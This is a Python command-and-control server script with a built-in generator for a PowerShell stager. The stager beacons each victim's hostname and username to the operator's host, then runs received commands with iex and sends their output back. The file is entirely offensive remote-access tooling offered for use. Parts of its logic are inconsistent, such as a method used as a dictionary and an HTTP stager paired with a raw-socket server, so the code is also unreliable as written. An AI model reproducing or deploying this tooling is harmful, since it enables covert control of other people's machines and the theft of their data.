#!/usr/bin/env python3
# c2_server.py - Full C2 listener with encryption
# Usage: python3 c2_server.py --port 443 --key Kestrel7_Win11_RevShell_2026

import socket
import ssl
import threading
import json
import time
import base64
import subprocess
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class C2Server:
    def __init__(self, host='0.0.0.0', port=443, key='Kestrel7_Win11_RevShell_2026'):
        self.host = host
        self.port = port
        self.key = key[:32].encode()
        self.clients = {}
        self.beacons = []
        self.running = True
        
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, b'\x00'*16)
        return cipher.encrypt(pad(data, AES.block_size))
    
    def decrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, b'\x00'*16)
        return unpad(cipher.decrypt(data), AES.block_size)
    
    def handle_client(self, conn, addr):
        print(f"[+] Connection from {addr}")
        client_id = f"{addr[0]}:{addr[1]}"
        self.clients[client_id] = conn
        
        while self.running:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                
                # Decrypt beacon
                try:
                    decrypted = self.decrypt(data)
                    beacon_data = json.loads(decrypted.decode('utf-8'))
                    self.beacons.append(beacon_data)
                    print(f"[BEACON] {beacon_data.get('hostname')} - {beacon_data.get('user')}")
                    
                    # Check for pending commands
                    if client_id in self.command_queue:
                        cmd = self.command_queue.pop(client_id)
                        encrypted_cmd = self.encrypt(cmd.encode())
                        conn.send(encrypted_cmd)
                    else:
                        # Send no-op (keep-alive)
                        conn.send(self.encrypt(b'{"cmd":"sleep"}'))
                    
                except Exception as e:
                    print(f"[ERROR] Decrypt failed: {e}")
                    conn.send(b'ERROR')
                    
            except Exception as e:
                print(f"[ERROR] {e}")
                break
        
        conn.close()
        del self.clients[client_id]
        print(f"[-] {addr} disconnected")
    
    def command_queue(self):
        # Command queue per client
        return {}
    
    def start(self):
        # SSL context
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile='server.crt', keyfile='server.key')
        
        # Raw socket fallback
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(5)
        
        # SSL wrap
        ssock = context.wrap_socket(sock, server_side=True)
        
        print(f"[*] C2 Listening on {self.host}:{self.port}")
        print("[*] Commands: 'list', 'exec <client> <cmd>', 'help', 'quit'")
        
        # Start interactive shell
        threading.Thread(target=self.interactive_shell, daemon=True).start()
        
        while self.running:
            try:
                conn, addr = ssock.accept()
                threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True).start()
            except Exception as e:
                print(f"[ERROR] Accept failed: {e}")
                break
    
    def interactive_shell(self):
        while self.running:
            try:
                cmd = input("\nC2> ").strip()
                if not cmd:
                    continue
                
                if cmd == 'list':
                    for i, beacon in enumerate(self.beacons[-10:]):
                        print(f"{i}: {beacon}")
                
                elif cmd.startswith('exec'):
                    parts = cmd.split(' ', 2)
                    if len(parts) >= 3:
                        client_id = parts[1]
                        command = parts[2]
                        if client_id in self.clients:
                            self.command_queue[client_id] = command
                            print(f"[*] Command sent to {client_id}")
                        else:
                            print(f"[!] Client {client_id} not connected")
                
                elif cmd == 'help':
                    print("Commands:")
                    print("  list                    - Show recent beacons")
                    print("  exec <client> <cmd>    - Execute command on client")
                    print("  quit                    - Shutdown C2 server")
                
                elif cmd == 'quit':
                    self.running = False
                    break
                
            except KeyboardInterrupt:
                self.running = False
                break
            except Exception as e:
                print(f"[ERROR] {e}")
    
    def generate_stager(self):
        # Generate PowerShell stager with current C2 IP/Port
        stager = f"""
        $c2 = "https://{self.host}:{self.port}/beacon"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        while($true) {{
            try {{
                $data = [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + "|" + $env:USERNAME)
                $response = $wc.UploadData($c2, "POST", $data)
                $cmd = [System.Text.Encoding]::UTF8.GetString($response)
                if ($cmd -ne "sleep") {{
                    $output = iex $cmd 2>&1 | Out-String
                    $wc.UploadData($c2, "POST", [System.Text.Encoding]::UTF8.GetBytes($output))
                }}
            }} catch {{}}
            Start-Sleep -Seconds 10
        }}
        """
        with open('payloads/stager.ps1', 'w') as f:
            f.write(stager)
        print("[*] Stager generated: payloads/stager.ps1")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, default=443)
    parser.add_argument('--key', default='Kestrel7_Win11_RevShell_2026')
    parser.add_argument('--generate-stager', action='store_true')
    args = parser.parse_args()
    
    server = C2Server(port=args.port, key=args.key)
    if args.generate_stager:
        server.generate_stager()
    server.start()
